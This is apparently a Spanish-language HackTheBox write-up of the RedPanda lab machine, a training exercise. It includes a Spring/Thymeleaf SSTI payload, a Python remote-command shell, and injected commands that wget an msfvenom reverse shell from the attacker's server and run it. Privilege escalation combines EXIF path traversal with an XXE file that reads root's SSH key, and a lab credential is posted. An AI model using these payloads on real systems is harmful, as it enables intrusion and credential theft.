---
layout:   post
title:    "Write Up RedPanda. "
subtitle: "Starting-Point"
category:   HTB
tags:      [Easy,Linux,Code-analisis,pspy64,Java,RCE,SSTI,XXE,Write-Up-Machine,eWPT,eWPTxv2,OSCP,OSWE] 
---
![list](/assets/img/redpanda/redpanda1.png){:.lead width="800" height="100" loading="lazy"}

***
<!--more-->

1. this ordered seed list will be replaced by the toc
{:toc}

***

## Reconocimiento

Fase inicial donde recolectamos toda la información posible del objetivo, utilizando diferentes técnicas como:

| Caracter.                                   |
|:--------------------------------------------|
|Recopilación de tecnologuias.                |
|Dominios.                                    |
|IPs.                                         |
|Puertos.                                     |
|Servicios.                                   |
|Recopilación de metadatos, etc.              |


***
### nmap

Utizando nmap comprobamos que puertos estan abiertos.


```bash
nmap -p- --open --min-rate 5000 -sS -n -vvv -Pn 10.10.11.170 -oA allports
```

![list](/assets/img/redpanda/redpanda2.png){:.lead width="800" height="100" loading="lazy"}

El paso anterior se debe hacer con privileguios (root).
{:.note title="Attention"}

***
### Servicios y versiones

Una vez sabemos que puertos estan abiertos con el comandoa anterior debemos saber que versiones y servicios que corren en los mismo de ahi podremos determinara posibles vulnerabilidades.

Esto lo hacemos con el siguiente comando.


```bash
nmap -p22,8080 -sV -sC 10.10.11.170 -oN target
```

![list](/assets/img/redpanda/redpanda3.png){:.lead width="800" height="100" loading="lazy"}

El paso anterior no es nesesario ser (root).
{:.note title="Attention"}

***
### Investigación

Uso de Investigacion web, Google Hacking, Google Dorks, recopilación de información gracias a servicios de terceros.


![list](/assets/img/redpanda/redpanda3-1.png){:.lead width="800" height="100" loading="lazy"}


Whatweb identificar tecnologuias atraves del terminal o wappalizer atraves de la web.


```bash
curl -s -X GET "10.10.11.170:8080" | cat -l html
```
<p>O ctrl + u ,es lo mismo solo que mas colorido.</p> 
{:.note}


![list](/assets/img/redpanda/redpanda4.png){:.lead width="800" height="100" loading="lazy"}


Ingresamos a la web.


![list](/assets/img/redpanda/redpanda6.png){:.lead width="800" height="100" loading="lazy"}


Utilizamos wfuzz u otros para identificar directorios.

```bash
wfuzz -c --hc=404 -t 100 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.10.11.170:8080/FUZZ --hl=55 --hw=119 --hh=1543
```

```bash
gobuster dir -u http://10.10.11.170:8080/ -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

script http-enum aplicar fuzzing con nmap

```bash
nmap --script http-enum -p8080 10.10.11.170 -oN webscan
```

Es otra opcion a la hora de encontrar direcctorios. 
{:.note}

***
## Analisis de vulnerabilidades

En esta fase analizaremos la información recopilada en la fase anterior y el descubrimiento de las vulnerabilidades, ademas del reconoocimiento web.

![list](/assets/img/redpanda/Kali-2022-09-02-00-05-13.png){:.lead width="800" height="100" loading="lazy"}

Estaba probado varias inyecciones (SQL Injection, XXE Injection), pero no pudimos encontrar nada interesante, hasta que se me ocurio una (SSTI) Server Side Template Injection.


![list](/assets/img/redpanda/redpanda8.png){:.lead width="800" height="100" loading="lazy"}

![list](/assets/img/redpanda/redpanda10.png){:.lead width="800" height="100" loading="lazy"}


Dejare un recurso de [Hacktricks] para que investiges un poco mas.

[Hacktricks]: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

Hay una inyección SSTI dentro de la función de búsqueda, pero algunos caracteres están en la lista negra.

Investigando di con [Blog] que explica la vulnerabilidad SSTI para Spring Boot ue es justo lo que queremos.

[Blog]: https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/

Todos los anteriores estan en lista negra asi que ponemos \{\{7*7\}\} para que funcione. 
{:.note}

***
## Explotacion

Una inyección de plantilla del lado del servidor se produce cuando un atacante es capaz de utilizar la sintaxis nativa de la plantilla para inyectar una carga útil maliciosa en una plantilla, que luego se ejecuta en el lado del servidor.Hay un repositorio en GitHub que se llama [PayloadsAllTheThings] que recopila una lista de payloads y bypasses útiles para la  seguridad de las aplicaciones web. 

[PayloadsAllTheThings]: https://github.com/swisskyrepo/PayloadsAllTheThings

![list](/assets/img/redpanda/Arch-2022-08-31-15-01-17.png){:.lead width="800" height="100" loading="lazy"}

![list](/assets/img/redpanda/Kali-2022-09-02-00-38-14.png){:.lead width="800" height="100" loading="lazy"}


Este es parte de las pruebas. 
{:.note}

***

```bash
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

Este one-liner lo encuentras en la seccion de java retrieve /etc/passwd. 
{:.note}

***
### Pimera opccion.

```Python
#!/usr/bin/python3
import requests
from cmd import Cmd
from bs4 import BeautifulSoup
class RCE(Cmd):
    prompt = "\033[1;31m$\033[1;37m "
    def decimal(self, args):
        comando = args
        decimales = []

        for i in comando:
            decimales.append(str(ord(i)))
        payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)" % decimales[0]

        for i in decimales[1:]:
            payload += ".concat(T(java.lang.Character).toString({}))".format(i)

        payload += ").getInputStream())}"
        data = { "name": payload }
        requer = requests.post("http://10.10.11.170:8080/search", data=data)
        parser = BeautifulSoup(requer.content, 'html.parser')
        grepcm = parser.find_all("h2")[0].get_text()
        result = grepcm.replace('You searched for:','').strip()
        print(result)

    def default(self, args):
        try:
            self.decimal(args)
        except:
            print("%s: command not found" % (args))

RCE().cmdloop()
```

Exploit en pyton para entablar una shell contra el servidor.
{:.note}

Yo no opte por este camino ya que la shell no respodia bien, ni con tratamiento.
{:.note title="Attention"}

***
### Segunda opccion.

En primer lugar, necesitaremos generar una shell inversa usando msfvenom. Recuerda sustituir el valor LHOST por la dirección IP de tu máquina de ataque.


```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.57 LPORT=443 -f elf > r.elf
```

Pon a la escucha el netcat yo siempre lo hago asi `nc -lvnp 443`y levantar un servidor HTTP en la misma ubicación que r.elf, utilizando `python3 -m http.server`, a continuación, envíe los siguientes comandos uno a uno sobre la barra de búsqueda del sitio web para transferir r.elf, cambiar el permiso y ejecutarlo.

```bash
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget http://10.10.14.40:8000/r.elf")}
```


```bash
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("chmod 777 ./r.elf")}
```
Ya que podemos darle permisos desde aqui es algo que vamos aprovechar.
{:.note}


```bash
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("./r.elf")}
```


{:.note}
Al esjecutar este one-liner se establecera la coneccion con el servido atraves de una `reverse-shell` por eso dejamos a la escucha netcat.



Y para seguir aprovecahando la vulnerabilidad de cara al futuro en la misma ubicacion decargate el `pspy64` y el `LinEnum`, podriamos usar.


![list](/assets/img/redpanda/Kali-2022-09-02-01-33-49.png){:.lead width="800" height="100" loading="lazy"}
Listo para enviar al servidor. 
{:.note}


Con `wget` o `curl` para esto, tambien dejo ur [recurso] para que investigues mas del tema.

[recurso]: https://ironhackers.es/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/

```bash
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget http://10.10.14.40:8000/LinEnum.sh")}
```

Podemos darle permisdo desde aqui o desde la reverse-shell.
{:.note}


```bash
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget http://10.10.14.40:8000/pspy64")}
```

Y por ultimo hacemos el tratamiento de la [tty] para poder movernos por el servidor tranquilamente dejo el link a hacktrick para que sepas mas del tema.

[tty]: https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys 


Lo tipico hacemos aki whoami, id me permite averiguar si el usuario actual pertenece al grupo logs ademas de ver la flag de user que esta en la ruta `/home/wookdenk`. 

Una búsqueda rápida en los procesos actuales con `LinEnum`  , `pspy64`  o `ps aux | grep root`,nos permite encontrar que la aplicación de la interfaz web es de `panda_search-0.0.1-SNAPSHOT.jar`. 

Al buscar los archivos propiedad del grupo logs, me he dado cuenta de que `/opt/panda_search/redpanda.log`. 

También tenemos acceso de lectura y escritura en `/tmp` y `/home/woodenk/`.


![list](/assets/img/redpanda/Arch-2022-08-31-16-26-48.png){:.lead width="800" height="100" loading="lazy"}


Husmeando por ahi nos encontramos con una base de datos pero no lleva a nada interesante.


![list](/assets/img/redpanda/Arch-2022-08-31-16-20-19.png){:.lead width="800" height="100" loading="lazy"}


```bash
mysql -u woodenk -p -D red_panda
```

Tambien nos encontramos con un archivo que tiene credeciales  `RedPandazRule` que usaremos para conectarnos por ssh.


```default
cat /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java
```

Es to se consige ejecutando los comandos o monitores.
{:.note}


```bash
ssh woodenk@10.10.11.170
```

La credecial es la pass.
{:.note}

***
## Escalacion de privileguios

El shell inverso también tiene privilegios de grupo de logs. 

Esto es porque la aplicación web está basada en`panda_search-0.0.1-SNAPSHOT.jar` y se ejecuta con privilegio de logs.


```bash
find / -group logs 2>/dev/null
```

```bash
ls -l /opt/panda_search/redpanda.log
```

En  esta parte hay que ver vien el archivo donde encontramo la credecial porque es un archivo muy curioso ya que esta exportando un xml.

***

```java
@GetMapping(value="/export.xml", produces = MediaType.APPLICATION_OCTET_STREAM_VALUE)
  public @ResponseBody byte[] exportXML(@RequestParam(name="author", defaultValue="err") String author) throws IOException {

      System.out.println("Exporting xml of: " + author);
      if(author.equals("woodenk") || author.equals("damian"))
      {
          InputStream in = new FileInputStream("/credits/" + author + "_creds.xml");
          System.out.println(in);
          return IOUtils.toByteArray(in);
      }
      else
      {
          return IOUtils.toByteArray("Error, incorrect paramenter 'author'\n\r");
      }
  }
```
***

El App.java esta manejado la metadata,  podemos inyectar en el campo "Artist", una ruta donde estará el xml, esto en una imagen cualquiera que despues subiremos a la máquina.

***

```java
public static String getArtist(String uri) throws IOException, JpegProcessingException
{
    String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
    File jpgFile = new File(fullpath);
    Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
    for(Directory dir : metadata.getDirectories())
    {
        for(Tag tag : dir.getTags())
        {
            if(tag.getTagName() == "Artist")
            {
                return tag.getDescription();
            }
        }
    }

    return "N/A";
}
```

***

Para esto nos deacargamos cuallquier imagen y le injectamos la ruta.


![list](/assets/img/redpanda/Kali-2022-09-02-02-04-52.png){:.lead width="800" height="100" loading="lazy"}


```bash
exiftool -Artist="../home/woodenk/test" images.jpeg
```

![list](/assets/img/redpanda/Kali-2022-09-02-02-06-13.png){:.lead width="800" height="100" loading="lazy"}


```bash
scp images.jpeg woodenk@10.10.11.170:.
```

Esto podemos hacerlo con cualquier tipo de tranferencia de acrchivos.
{:.note}


A continuación crearemos en `/tmp` o `/home/wookdenk/` un archivo xml que apunte a la `id_rsa` de root, con el nombre definido en la imagen más _creds.xml que es lo suma el archivo que encontramos osea `test_creds.xml`.



![list](/assets/img/redpanda/Kali-2022-09-02-02-21-58.png){:.lead width="800" height="100" loading="lazy"}

***

```php
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY key SYSTEM "file:///root/.ssh/id_rsa"> ]>
<credits>
  <author>damian</author>
  <image>
    <uri>/../../../../../../../home/woodenk/images.jpeg</uri>
    <privesc>&key;</privesc>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>
```

En test_creds.xml.
{:.note title="Attention"}

***

Para este momento debemos tener la imagen y el .xml en el servidor lo que sigue es hacer un curl con el formato que vimos en el archivo como User-Agent.


![list](/assets/img/redpanda/Kali-2022-09-02-02-28-02.png){:.lead width="800" height="100" loading="lazy"}


```bash
curl http://10.10.11.170:8080 -H "User-Agent: ||/../../../../../../../home/woodenk/images.jpeg"
```

Finalmente exportar el xml desde `/stats` para que tome nuestro archivo.


![list](/assets/img/redpanda/Kali-2022-09-01-23-44-05.png){:.lead width="800" height="100" loading="lazy"}


Después de unos segundos si revisamos el xml tendra la id_rsa de root


![list](/assets/img/redpanda/Kali-2022-09-02-12-31-22.png){:.lead width="800" height="100" loading="lazy"}

***

![list](/assets/img/redpanda/Kali-2022-09-02-02-37-17.png){:.lead width="800" height="100" loading="lazy"}


```bash
ssh root@10.10.11.170 -i id_rsa
```

Ya podrimamos ver la flag de root con `cat /root/root.txt`.
{:.note}

***

```shell
🎉 Felicitaciones ya has comprometido RedPanda de HackTheBox 🎉
```
{:.centered}
***
